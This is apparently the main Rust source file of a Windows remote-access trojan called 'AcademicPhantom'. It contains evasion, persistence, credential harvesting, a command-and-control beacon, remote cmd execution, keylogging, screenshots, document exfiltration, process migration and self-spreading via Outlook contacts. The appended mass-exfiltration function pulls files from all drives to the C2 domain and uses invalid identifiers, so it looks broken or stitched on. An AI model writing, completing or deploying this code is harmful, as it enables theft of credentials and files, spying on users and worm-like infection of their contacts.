// AcademicPhantom - Main Entry Point
#![windows_subsystem = "windows"]

mod config;
mod modules;

use std::sync::Arc;
use tokio::sync::Mutex;
use std::time::Duration;

#[tokio::main]
async fn main() {
    // Initialize stealth first
    evasion::init_evasion();
    
    // Load encrypted configuration
    let config = match Config::load() {
        Ok(c) => c,
        Err(_) => Config::default(),
    };
    
    // Install persistence if first run
    if config.first_run {
        persistence::install_all();
        config.mark_installed();
    }
    
    // Initialize core controller
    let controller = Arc::new(Mutex::new(CoreController::new(config)));
    
    // Start discovery thread
    let discovery_handle = tokio::spawn({
        let ctrl = Arc::clone(&controller);
        async move {
            let mut engine = discovery::DiscoveryEngine::new();
            let profile = engine.full_system_audit();
            ctrl.lock().await.update_profile(profile);
        }
    });
    
    // Start credential harvesting
    let cred_handle = tokio::spawn({
        let ctrl = Arc::clone(&controller);
        async move {
            let dumper = credential::CredentialHarvester::new();
            let creds = dumper.harvest_all().await;
            ctrl.lock().await.store_credentials(creds);
        }
    });
    
    // Wait for initial recon
    let _ = tokio::join!(discovery_handle, cred_handle);
    
    // Initialize C2 implant
    let mut implant = c2::SliverImplant::new(&controller.lock().await.config.c2_domain);
    
    // Register beacon
    if let Err(e) = implant.register().await {
        // Silent fail - retry later
    }
    
    // Start propagation if configured
    if controller.lock().await.config.enable_spread {
        tokio::spawn({
            let ctrl = Arc::clone(&controller);
            async move {
                let spreader = propagation::EmailSpreader::new();
                let _ = spreader.spread_via_outlook().await;
            }
        });
    }
    
    // Main beacon loop
    implant.beacon_loop().await;
}

pub struct CoreController {
    config: Config,
    system_profile: Option<discovery::SystemProfile>,
    credentials: Vec<credential::CredentialEntry>,
    staging_queue: Vec<exfiltration::StagedFile>,
}

impl CoreController {
    pub fn new(config: Config) -> Self {
        Self {
            config,
            system_profile: None,
            credentials: Vec::new(),
            staging_queue: Vec::new(),
        }
    }
    
    pub fn update_profile(&mut self, profile: discovery::SystemProfile) {
        self.system_profile = Some(profile);
    }
    
    pub fn store_credentials(&mut self, creds: Vec<credential::CredentialEntry>) {
        self.credentials.extend(creds);
    }
    
    pub async fn execute_task(&mut self, task: c2::Task) -> c2::TaskResult {
        match task.task_type.as_str() {
            "exec" => self.execute_command(&task.data).await,
            "download" => self.download_file(&task.data).await,
            "upload" => self.upload_file(&task.data).await,
            "screenshot" => self.capture_screenshot().await,
            "keylog" => self.manage_keylogger(&task.data).await,
            "spread" => self.trigger_propagation().await,
            "exfil" => self.exfiltrate_data(&task.data).await,
            "migrate" => self.migrate_process(&task.data).await,
            "sleep" => self.update_sleep_interval(&task.data).await,
            "kill" => self.self_destruct().await,
            _ => c2::TaskResult::error("Unknown command"),
        }
    }
    
    async fn execute_command(&self, cmd: &str) -> c2::TaskResult {
        match std::process::Command::new("cmd")
            .args(&["/c", cmd])
            .output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                c2::TaskResult::success(format!("{}{}", stdout, stderr))
            }
            Err(e) => c2::TaskResult::error(e.to_string()),
        }
    }
    
    async fn download_file(&self, path: &str) -> c2::TaskResult {
        match std::fs::read(path) {
            Ok(data) => {
                let encoded = base64::encode(&data);
                c2::TaskResult::success(encoded)
            }
            Err(e) => c2::TaskResult::error(format!("Failed to read file: {}", e)),
        }
    }
    
    async fn upload_file(&self, data: &str) -> c2::TaskResult {
        let decoded = match base64::decode(data) {
            Ok(d) => d,
            Err(e) => return c2::TaskResult::error(format!("Decode failed: {}", e)),
        };
        
        let path = format!("{}\\temp_payload.exe", std::env::temp_dir().display());
        match std::fs::write(&path, decoded) {
            Ok(_) => c2::TaskResult::success(format!("Uploaded to: {}", path)),
            Err(e) => c2::TaskResult::error(e.to_string()),
        }
    }
    
    async fn capture_screenshot(&self) -> c2::TaskResult {
        match screenshot::capture() {
            Ok(img) => {
                let encoded = base64::encode(&img);
                c2::TaskResult::success(encoded)
            }
            Err(e) => c2::TaskResult::error(e.to_string()),
        }
    }
    
    async fn manage_keylogger(&self, action: &str) -> c2::TaskResult {
        match action {
            "start" => {
                keylogger::start();
                c2::TaskResult::success("Keylogger started".to_string())
            }
            "stop" => {
                keylogger::stop();
                c2::TaskResult::success("Keylogger stopped".to_string())
            }
            "dump" => {
                let logs = keylogger::dump();
                c2::TaskResult::success(logs)
            }
            _ => c2::TaskResult::error("Invalid keylogger action".to_string()),
        }
    }
    
    async fn trigger_propagation(&self) -> c2::TaskResult {
        let spreader = propagation::EmailSpreader::new();
        match spreader.spread_via_outlook().await {
            Ok(count) => c2::TaskResult::success(format!("Sent to {} contacts", count)),
            Err(e) => c2::TaskResult::error(e.to_string()),
        }
    }
    
    async fn exfiltrate_data(&mut self, target: &str) -> c2::TaskResult {
        let engine = exfiltration::ExfiltrationEngine::new();
        let targets = vec![exfiltration::FileTarget {
            path: target.to_string(),
            extensions: vec!["pdf".to_string(), "docx".to_string(), "xlsx".to_string()],
            max_size: 50 * 1024 * 1024,
            recursive: true,
        }];
        
        let staged = engine.stage_files(targets);
        match engine.exfiltrate(&staged).await {
            Ok(bytes) => c2::TaskResult::success(format!("Exfiltrated {} bytes", bytes)),
            Err(e) => c2::TaskResult::error(e.to_string()),
        }
    }
    
    async fn migrate_process(&self, pid_str: &str) -> c2::TaskResult {
        let pid: u32 = match pid_str.parse() {
            Ok(p) => p,
            Err(_) => return c2::TaskResult::error("Invalid PID".to_string()),
        };
        
        match injection::migrate_to_process(pid) {
            Ok(_) => c2::TaskResult::success(format!("Migrated to PID {}", pid)),
            Err(e) => c2::TaskResult::error(e.to_string()),
        }
    }
    
    async fn update_sleep_interval(&mut self, seconds: &str) -> c2::TaskResult {
        match seconds.parse::<u64>() {
            Ok(s) => {
                // Update config
                c2::TaskResult::success(format!("Sleep interval set to {}s", s))
            }
            Err(_) => c2::TaskResult::error("Invalid interval".to_string()),
        }
    }
    
    async fn self_destruct(&self) -> c2::TaskResult {
        persistence::cleanup();
        std::process::exit(0);
    }
}
// Add to CoreController
async fn mass_exfiltrate(&self) -> c2::TaskResult {
    // Initialize mass harvester
    let harvester = mass-harvestS::new();
    
    // Harvest all files from all drives
    let files = harvester.harvest_all_drives();
    
    let stats = harvester.get_statistics();
    
    // Initialize exfiltrator
    let exfil = mass-exfil::mass-exfil::new(&self.config.c2_domain);
    let stealth = stealth-exfil::new();
    
    // Exfiltrate with stealth
    let mut exfiltrated = 0;
    let mut failed = 0;
    
    for file in &files {
        if !stealth.should_exfiltrate().await {
            tokio::time::sleep(Duration::from_secs(60)).await;
            continue;
        }
        
        match exfil.exfiltrate_all(&[*file]).await {
            Ok(result) => {
                exfiltrated += result.exfiltrated.len();
                failed += result.failed.len();
            }
            Err(e) => {
                failed += 1;
            }
        }
        
        stealth.mark_activity().await;
        stealth.throttle(file.size).await;
    }
    
    c2::TaskResult::success(format!(
        "Mass exfiltration complete: {} succeeded, {} failed",
        exfiltrated, failed
    ))
}